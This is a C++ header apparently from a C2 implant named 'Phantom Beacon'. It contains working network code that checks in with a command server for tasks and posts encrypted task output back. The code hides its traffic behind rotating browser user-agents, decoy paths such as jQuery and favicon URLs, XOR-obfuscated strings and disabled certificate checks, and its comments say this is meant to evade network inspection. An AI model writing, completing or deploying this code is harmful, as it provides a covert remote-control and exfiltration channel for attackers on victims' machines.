#pragma once
// ============================================================================
//  network.h — Phantom Beacon Network Layer
//  ──────────────────────────────────────────
//  HTTPS communication with the C2 server using WinHTTP.
//  Traffic appears as standard HTTPS — indistinguishable from browser traffic
//  to network inspection tools.
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <winhttp.h>
    #pragma comment(lib, "winhttp.lib")
#else
    #include <curl/curl.h>
    #include <string.h>
    #include <algorithm>
#endif
#include <string>
#include <cstdlib>
#include <ctime>

#include "crypto.h"
#include "evasion.h"

namespace net {

struct C2Config;

// ── WinHTTP Connection State ──────────────────────────────────────────────
// Encapsulated handles: no static globals, single inline instance.
struct WinHttpContext {
    HINTERNET hSession = nullptr;
    HINTERNET hConnect = nullptr;

    bool ensure(const C2Config& cfg);
    void cleanup();
};

inline WinHttpContext g_ctx;

// ── Configuration ──────────────────────────────────────────────────────────
// These will be patched at compile time or set via config.
struct C2Config {
    std::wstring host      = XOR_WDEC(XOR_WSTR(L"127.0.0.1")).c_str();
    int          port      = 8443;
    bool         use_https = true;
    int          sleep_ms  = 5000;     // Base sleep interval (ms)
    int          jitter    = 30;       // Jitter percentage (0-100)
    std::string  beacon_id;            // Unique agent identifier

    // Calculate actual sleep with jitter
    int get_sleep_ms() const {
        if (jitter <= 0) return sleep_ms;
        int variation = (sleep_ms * jitter) / 100;
        // Simple random without pulling in <random> (lighter binary)
        int offset = (rand() % (2 * variation + 1)) - variation;
        return std::max(1000, sleep_ms + offset);  // Minimum 1 second
    }
};

inline std::wstring get_random_ua();

inline bool WinHttpContext::ensure(const C2Config& cfg) {
    if (hSession && hConnect) return true;
    
    if (hConnect) { WinHttpCloseHandle(hConnect); hConnect = nullptr; }
    if (hSession) { WinHttpCloseHandle(hSession); hSession = nullptr; }
    
    std::wstring ua = get_random_ua();
    hSession = WinHttpOpen(
        ua.c_str(),
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (hSession) {
        hConnect = WinHttpConnect(
            hSession,
            cfg.host.c_str(),
            static_cast<INTERNET_PORT>(cfg.port), 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            hSession = nullptr;
            return false;
        }
    }
    return hSession && hConnect;
}

// ── User-Agent Rotation ────────────────────────────────────────────────────
// Rotate through common browser user-agents to blend in with normal traffic.

#ifdef _WIN32
inline std::wstring get_random_ua() {
    int r = rand() % 3;
    if (r == 0) {
        auto enc = XOR_WSTR(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");
        return std::wstring(XOR_WDEC(enc).c_str());
    }
    if (r == 1) {
        auto enc = XOR_WSTR(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0");
        return std::wstring(XOR_WDEC(enc).c_str());
    }
    auto enc = XOR_WSTR(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0");
    return std::wstring(XOR_WDEC(enc).c_str());
}

inline std::string http_request(
    const C2Config& cfg,
    const std::wstring& method,
    const std::wstring& path,
    const std::string& body = "",
    const std::string& beacon_id = ""
) {
    std::string response_body;
    if (!g_ctx.ensure(cfg)) return "";

    DWORD flags = cfg.use_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(
        g_ctx.hConnect,
        method.c_str(),
        path.c_str(),
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags);
    if (!hRequest) {
        g_ctx.cleanup();
        return "";
    }

    WinHttpSetTimeouts(hRequest, 15000, 15000, 30000, 30000);

    if (cfg.use_https) {
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }
// Obfuscate the Content-Type header using compile‑time XOR
auto enc_ct = XOR_STR("Content-Type: text/plain\r\n");
std::string s_ct = XOR_DEC(enc_ct).c_str();
std::wstring headers(s_ct.begin(), s_ct.end());

// ALWAYS add X-Beacon-Id
auto enc_xb = XOR_STR("X-Beacon-Id: ");
std::string s_xb = XOR_DEC(enc_xb).c_str();
std::wstring wprefix(s_xb.begin(), s_xb.end());

auto enc_rn = XOR_STR("\r\n");
std::string s_rn = XOR_DEC(enc_rn).c_str();
std::wstring wrn(s_rn.begin(), s_rn.end());

std::wstring wid(beacon_id.begin(), beacon_id.end());
headers += wprefix + wid + wrn;

BOOL bResult = WinHttpSendRequest(
    hRequest,
    headers.c_str(),
    static_cast<DWORD>(headers.length()),
    WINHTTP_NO_REQUEST_DATA,
    0,
    static_cast<DWORD>(body.size()),
    0);
if (!bResult) {
    g_ctx.cleanup();
    WinHttpCloseHandle(hRequest);
    return "";
}

// Send body in chunks if present
if (!body.empty()) {
    DWORD totalSent = 0;
    while (totalSent < static_cast<DWORD>(body.size())) {
        DWORD chunkSize = static_cast<DWORD>(body.size()) - totalSent;
        if (chunkSize > 65536) chunkSize = 65536;
        if (!WinHttpWriteData(hRequest,
                body.c_str() + totalSent,
                chunkSize,
                &chunkSize)) {
            g_ctx.cleanup();
            WinHttpCloseHandle(hRequest);
            return "";
        }
        totalSent += chunkSize;
    }
}

bResult = WinHttpReceiveResponse(hRequest, nullptr);
    if (!bResult) {
        g_ctx.cleanup();
        WinHttpCloseHandle(hRequest);
        return "";
    }

    {
        DWORD dwSize = 0;
        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;

            std::vector<char> buffer(dwSize + 1, 0);
            DWORD dwDownloaded = 0;
            if (WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) {
                response_body.append(buffer.data(), dwDownloaded);
            }
        } while (dwSize > 0);
    }

    WinHttpCloseHandle(hRequest);
    return response_body;
}
#else
inline std::string get_random_ua() {
    int r = rand() % 3;
    if (r == 0) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")).c_str();
    if (r == 1) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0")).c_str();
    return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0")).c_str();
}

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

inline std::string http_request(
    const C2Config& cfg,
    const std::wstring& method,
    const std::wstring& path,
    const std::string& body = "",
    const std::string& beacon_id = ""
) {
    std::string response_body;
    CURL *curl = curl_easy_init();
    if (!curl) return "";

    std::string proto = cfg.use_https ? XOR_DEC(XOR_STR("https://")).c_str() : XOR_DEC(XOR_STR("http://")).c_str();
    std::string host_narrow(cfg.host.begin(), cfg.host.end());
    std::string path_narrow(path.begin(), path.end());
    std::string url = proto + host_narrow + XOR_DEC(XOR_STR(":")).c_str() + std::to_string(cfg.port) + path_narrow;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_USERAGENT, get_random_ua().c_str());
    
    std::string method_narrow(method.begin(), method.end());
    if (method_narrow == XOR_DEC(XOR_STR("POST")).c_str()) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        if (!body.empty()) {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, body.size());
        }
    } else {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method_narrow.c_str());
    }

    // Explicit timeout: 5 seconds for connection, 10 seconds total
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    struct curl_slist *headers = NULL;
    auto enc_ct = XOR_STR("Content-Type: text/plain");
    headers = curl_slist_append(headers, XOR_DEC(enc_ct).c_str());
    if (!beacon_id.empty()) {
        auto enc_xb = XOR_STR("X-Beacon-Id: ");
        std::string h = std::string(XOR_DEC(enc_xb).c_str()) + beacon_id;
        headers = curl_slist_append(headers, h.c_str());
    }
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);

    if (cfg.use_https) {
        // Enforce SSL verification (removed bypass)
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    }

    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return response_body;
}
#endif

// ── High-Level C2 Functions ────────────────────────────────────────────────

// ── Malleable URIs ─────────────────────────────────────────────────────────

inline std::wstring get_malleable_path(const std::wstring& original) {
    int r = rand() % 4;
    if (r == 0) return original;
    if (r == 1) return XOR_WDEC(XOR_WSTR(L"/js/jquery-3.6.0.min.js")).c_str();
    if (r == 2) return XOR_WDEC(XOR_WSTR(L"/static/css/bootstrap.min.css")).c_str();
    return XOR_WDEC(XOR_WSTR(L"/favicon.ico")).c_str();
}

inline std::wstring get_malleable_result_path() {
    int r = rand() % 3;
    if (r == 0) return XOR_WDEC(XOR_WSTR(L"/api/v1/result")).c_str();
    if (r == 1) return XOR_WDEC(XOR_WSTR(L"/login.php")).c_str();
    return XOR_WDEC(XOR_WSTR(L"/upload.aspx")).c_str();
}

// ── Check-in & Result ──────────────────────────────────────────────────────

// Check in with the C2 server and retrieve pending tasks.
// Returns the decrypted JSON string with tasks, or "" on failure.
inline std::string checkin(const C2Config& cfg, const std::string& payload = "") {
    std::wstring method = payload.empty() ? XOR_WDEC(XOR_WSTR(L"GET")).c_str() : XOR_WDEC(XOR_WSTR(L"POST")).c_str();
    
    std::string body = payload.empty() ? "" : crypto::encrypt(payload);
    
    std::wstring path = get_malleable_path(XOR_WDEC(XOR_WSTR(L"/api/v1/ping")).c_str());
    
    std::string encrypted_response = http_request(
        cfg, method, path, body, cfg.beacon_id);

    if (encrypted_response.empty()) return "";
    return crypto::decrypt(encrypted_response);
}

// Send an encrypted result back to the C2 server.
inline bool send_result(const C2Config& cfg, const std::string& task_id, const std::string& output) {
    // Escape the output for JSON
    std::string escaped_output;
    for (char c : output) {
        if (c == '"') escaped_output += "\\\"";
        else if (c == '\\') escaped_output += "\\\\";
        else if (c == '\n') escaped_output += "\\n";
        else if (c == '\r') escaped_output += "\\r";
        else if (c == '\t') escaped_output += "\\t";
        else escaped_output += c;
    }

    // Build JSON payload
    std::string json = std::string(XOR_DEC(XOR_STR("{\"task_id\":\"")).c_str()) + task_id + XOR_DEC(XOR_STR("\",\"output\":\"")).c_str() + escaped_output + XOR_DEC(XOR_STR("\"}")).c_str();

    std::string encrypted = crypto::encrypt(json);
    if (encrypted.empty()) return false;
    
    std::wstring path = get_malleable_result_path();
    std::string resp = http_request(cfg, XOR_WDEC(XOR_WSTR(L"POST")).c_str(), path, encrypted, cfg.beacon_id);
    return !resp.empty();
}

inline void cleanup() {
    g_ctx.cleanup();
}

inline void WinHttpContext::cleanup() {
    if (hConnect) { WinHttpCloseHandle(hConnect); hConnect = nullptr; }
    if (hSession) { WinHttpCloseHandle(hSession); hSession = nullptr; }
}

}  // namespace net
